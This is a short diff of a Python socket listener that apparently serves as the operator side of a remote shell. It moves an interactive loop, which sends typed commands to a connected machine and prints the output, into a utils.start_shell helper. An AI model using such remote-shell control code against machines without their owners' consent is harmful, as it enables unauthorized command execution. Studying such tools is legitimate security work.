@@ -14,13 +14,5 @@ print("Listening for connections")
 
 target, ip = s.accept()
 print("Connection established from %s" % str(ip))
-while True:
-    cmd = input(f"{ip}~$ ")
-    utils.reliable_send(target, cmd)
-    if(cmd == "close"):
-        target.close()
-        break
-    message = utils.receive_frame(target)
-    if message:
-        print(f"{ip}~$ {message}", flush=True)
+utils.start_shell(target,ip)
 s.close()
